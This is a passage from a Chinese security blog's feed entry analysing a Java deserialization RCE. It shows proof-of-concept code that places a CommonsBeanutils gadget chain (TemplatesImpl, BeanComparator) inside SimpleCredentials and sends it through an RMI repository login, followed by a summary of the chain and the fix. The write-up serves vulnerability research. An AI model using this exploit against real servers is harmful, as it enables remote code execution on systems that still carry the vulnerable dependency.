class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(queue,<span class="string">&quot;queue&quot;</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates,templates&#125;);<span class="comment">// 设置BeanComparator.compare()的参数</span></span><br><span class="line">        setFieldValue(comparator,<span class="string">&quot;property&quot;</span>,<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        <span class="type">SimpleCredentials</span> <span class="variable">simpleCredentials</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleCredentials</span>(<span class="string">&quot;1&quot;</span>, <span class="string">&quot;1&quot;</span>.toCharArray());</span><br><span class="line">        simpleCredentials.setAttribute(<span class="string">&quot;a&quot;</span>,queue);</span><br><span class="line">        <span class="type">URLRemoteRepository</span> <span class="variable">repository</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLRemoteRepository</span>(<span class="string">&quot;http://localhost:8080/rmi&quot;</span>);</span><br><span class="line">        repository.login(simpleCredentials);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>利用链子</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">远程调用ServerRipository.login()方法</span><br><span class="line">反序列化SimpleCredentials对象Attribute属性</span><br><span class="line">HashMap.readObject()</span><br><span class="line">CB链</span><br><span class="line"></span><br><span class="line">//其实就是我们先获取到服务端的远程存储库对象   然后调用该对象的login方法来进行登录   然后服务端那边的login方法就会来处理我们的请求  因为我们客户端使用的login方法  需要给服务端这边传两个参数  其中一个就是我们可控的SimpleCredentials类  然后因为其中有个参数是Hashmap对象的 并且可以赋值  服务端又存在cb链依赖  </span><br><span class="line">我们就可以构造恶意的SimpleCredentials类传到服务端 然后服务端就会反序列化我们传入的SimpleCredentials类  这样就造成了RCE</span><br><span class="line"></span><br><span class="line">(其过程是服务端开启了一个RMI服务，客户端调用该服务并发送恶意对象，服务端反序列化恶意对象，触发RCE)</span><br></pre></td></tr></table></figure><p>官方的修复方案就是将CB链的依赖给删除了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;参考链接&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/13118&quot;&gt;https://xz.aliyun.com/t/13118&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://boogipop.com/2023/10/16/Apa</summary>
      
    
    
    
    
    <category term="Java" scheme="https://ke1nys.github.io/tags/Java/"/>
    
  </entry>
  
</feed>
